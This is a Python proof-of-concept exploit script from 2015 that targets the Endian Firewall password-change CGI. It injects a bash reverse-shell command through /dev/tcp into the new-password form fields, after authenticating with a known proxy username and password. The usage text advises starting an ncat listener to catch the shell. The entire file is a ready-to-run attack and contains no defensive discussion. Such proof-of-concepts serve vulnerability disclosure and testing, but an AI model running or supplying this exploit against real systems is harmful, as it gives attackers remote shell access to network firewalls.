#!/usr/bin/env python
 
# Endian Firewall Proxy User Password Change (/cgi-bin/chpasswd.cgi)
# OS Command Injection Exploit POC (Reverse TCP Shell)
# Ben Lincoln, 2015-06-28
# http://www.beneaththewaves.net/
# Requires knowledge of a valid proxy username and password on the target Endian Firewall
 
import httplib
import sys
 
proxyUserPasswordChangeURI = "/cgi-bin/chpasswd.cgi"
 
def main():
    if len(sys.argv) < 7:
        print "Endian Firewall Proxy User Password Change (/cgi-bin/chpasswd.cgi) Exploit\r\n"
        print "Usage: " + sys.argv[0] + " [TARGET_SYSTEM_IP] [TARGET_SYSTEM_WEB_PORT] [PROXY_USER_NAME] [PROXY_USER_PASSWORD] [REVERSE_SHELL_IP] [REVERSE_SHELL_PORT]\r\n"
        print "Example: " + sys.argv[0] + " 172.16.97.1 10443 proxyuser password123 172.16.97.17 443\r\n"
        print "Be sure you've started a TCP listener on the specified IP and port to receive the reverse shell when it connects.\r\n"
        print "E.g. ncat -nvlp 443"
        sys.exit(1)
 
    multipartDelimiter = "---------------------------334002631541493081770656718"
     
    targetIP = sys.argv[1]
    targetPort = sys.argv[2]
    userName = sys.argv[3]
    password = sys.argv[4]
    reverseShellIP = sys.argv[5]
    reverseShellPort = sys.argv[6]
 
    exploitString = password + "; /bin/bash -c /bin/bash -i >& /dev/tcp/" + reverseShellIP + "/" + reverseShellPort + " 0>&1;"
 
    endianURL = "https://" + targetIP + ":" + targetPort + proxyUserPasswordChangeURI
 
    conn = httplib.HTTPSConnection(targetIP, targetPort)
    headers = {}
    headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0"
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    headers["Accept-Encoding"] = ""
    headers["Referer"] = "https://" + targetIP + ":" + targetPort + proxyUserPasswordChangeURI
    headers["Content-Type"] = "multipart/form-data; boundary=" + multipartDelimiter
    headers["Accept-Language"] = "en-US,en;q=0.5"
    headers["Connection"] = "keep-alive"
 
    multipartDelimiter = "--" + multipartDelimiter
 
    body = multipartDelimiter + "\r\n"
    body = body + "Content-Disposition: form-data; name=\"ACTION\"\r\n\r\n"
    body = body + "change\r\n"
    body = body + multipartDelimiter + "\r\n"
    body = body + "Content-Disposition: form-data; name=\"USERNAME\"\r\n\r\n"
    body = body + userName + "\r\n"
    body = body + multipartDelimiter + "\r\n"
    body = body + "Content-Disposition: form-data; name=\"OLD_PASSWORD\"\r\n\r\n"
    body = body + password + "\r\n"
    body = body + multipartDelimiter + "\r\n"
    body = body + "Content-Disposition: form-data; name=\"NEW_PASSWORD_1\"\r\n\r\n"
    body = body + exploitString + "\r\n"
    body = body + multipartDelimiter + "\r\n"
    body = body + "Content-Disposition: form-data; name=\"NEW_PASSWORD_2\"\r\n\r\n"
    body = body + exploitString + "\r\n"
    body = body + multipartDelimiter + "\r\n"
    body = body + "Content-Disposition: form-data; name=\"SUBMIT\"\r\n\r\n"
    body = body + "  Change password\r\n"
    body = body + multipartDelimiter + "--" + "\r\n"
 
    conn.request("POST", proxyUserPasswordChangeURI, body, headers)
    response = conn.getresponse()
    print "HTTP " + str(response.status) + " " + response.reason + "\r\n"
    print response.read()
    print "\r\n\r\n"
 
if __name__ == "__main__":
    main()

